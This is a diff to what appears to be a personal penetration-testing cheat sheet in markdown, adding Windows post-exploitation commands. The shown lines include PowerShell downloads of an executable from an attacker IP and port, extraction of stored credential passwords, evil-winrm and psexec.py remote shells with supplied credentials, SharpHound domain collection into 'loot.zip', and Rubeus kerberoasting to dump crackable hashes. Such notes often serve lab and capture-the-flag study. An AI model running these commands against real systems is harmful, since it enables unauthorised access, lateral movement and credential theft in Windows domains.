@@ -229,10 +229,6 @@ dir /a:h `show only hidden files`<br/>
 `powershell -c "wget http://<ip>:<port>/<file>" -outfile output.exe`<br />
 `powershell Invoke-WebRequest -Uri $ip -OutFile $filepath`
 
-### Active Directory
-`powershell -ep bypass`  load a powershell shell with execution policy bypassed <br/>
-`. .\PowerView.ps1`      import the PowerView module
-
 ## List Drives
 `wmic logicaldisk get caption`
 
@@ -240,6 +236,32 @@ dir /a:h `show only hidden files`<br/>
 * $file = Import-Clixml -Path <path_to_file>
 * $file.GetNetworkCredential().username
 * $file.GetNetworkCredential().password
+
+### Evil-winrm
+`evil-winrm -i 10.10.213.169 -u <USER> -p '<PASS>'`
+
+### Psexec.py
+` python psexec.py DOMAIN/USER:PASS@IP`
+
+
+### Active Directory
+`powershell -ep bypass`  load a powershell shell with execution policy bypassed <br/>
+`. .\PowerView.ps1`      import the PowerView module
+
+##### Using Bloodhound
+
+* Upload `Sharphound.ps1` (https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
+* Then `. .\Sharhound.ps1`
+* `Invoke-Bloodhound -CollectionMethod All -Domain DOMAIN-NAME -ZipFileName loot.zip` Domain name can be found by running `Get-ADDomain` and look for result
+<img src="https://imgur.com/NxWapei.png"/>
+* This command will give an archive which you will have to simply drag and drop on the bloodhound GUI running on your local machine and then quries for kerberoastable accounts or getting more information
+
+##### Using Rubeus
+
+* Download rubeus `https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe`
+* Documentation `https://github.com/GhostPack/Rubeus`
+* Transfer rubeus.exe on targeted windows machine and run `.\Rubeus.exe kerberoast /outfile:C:\temp\hash.txt` to get a hash
+
 # Msfvenom
 ### List All Payloads
 msfvenom -l payloads
